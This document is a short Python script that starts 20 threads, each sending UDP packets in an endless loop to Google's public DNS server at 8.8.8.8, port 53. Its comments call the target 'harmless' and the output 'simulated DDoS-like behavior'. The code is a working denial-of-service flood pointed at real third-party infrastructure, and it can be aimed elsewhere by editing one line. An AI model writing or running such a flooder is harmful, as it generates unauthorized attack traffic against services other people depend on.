import time
import socket
import threading

TARGET = "8.8.8.8"   # Google DNS (harmless)
PORT = 53

def flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"TEST", (TARGET, PORT))
        except:
            pass

# Launch many threads = looks like DDoS behavior
for _ in range(20):
    t = threading.Thread(target=flood)
    t.daemon = True
    t.start()

print("Simulated DDoS-like behavior running...")
while True:
    time.sleep(1)
